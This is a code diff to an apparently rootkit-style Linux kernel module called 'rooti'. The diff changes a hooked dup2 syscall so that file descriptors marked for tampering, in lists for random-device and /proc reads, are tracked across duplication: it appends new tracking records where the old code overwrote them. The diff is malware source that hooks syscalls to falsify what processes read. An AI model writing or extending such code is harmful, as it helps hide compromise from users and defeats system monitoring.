@@ -237,16 +237,38 @@ static asmlinkage long rooti_hook_dup2(const struct pt_regs *regs)
     int oldfd = regs->di;
     int newfd = rooti_orig_dup2(regs);
 
-    // If present, update the FD of the tampered file. TODO: add instead of delete
+    // If present, update the FD of the tampered file.
     struct rooti_tamper_fd *record;
-    list_for_each_entry(record, &rooti_random_tamper_fds, head) {
+    struct rooti_tamper_fd *tmp;
+    struct rooti_tamper_fd *new;
+    list_for_each_entry_safe(record, tmp, &rooti_random_tamper_fds, head) {
         if (pid == record->pid && oldfd == record->fd) {
-            record->fd = newfd;
+            // Append new record for duplicated FD
+            new = kmalloc(sizeof(*new), GFP_KERNEL);
+            if (new == NULL) {
+                printk(KERN_DEBUG "rooti: failed to allocate memory\n");
+                return newfd;
+            }
+            new->pid = pid;
+            new->fd = newfd; 
+
+            INIT_LIST_HEAD(&new->head);
+            list_add_tail(&new->head, &rooti_random_tamper_fds);
         }
     }
-    list_for_each_entry(record, &rooti_proc_tamper_fds, head) {
+    list_for_each_entry_safe(record, tmp, &rooti_proc_tamper_fds, head) {
         if (pid == record->pid && oldfd == record->fd) {
-            record->fd = newfd;
+            // Append new record for duplicated FD
+            new = kmalloc(sizeof(*new), GFP_KERNEL);
+            if (new == NULL) {
+                printk(KERN_DEBUG "rooti: failed to allocate memory\n");
+                return newfd;
+            }
+            new->pid = pid;
+            new->fd = newfd; 
+
+            INIT_LIST_HEAD(&new->head);
+            list_add_tail(&new->head, &rooti_proc_tamper_fds);
         }
     }
 
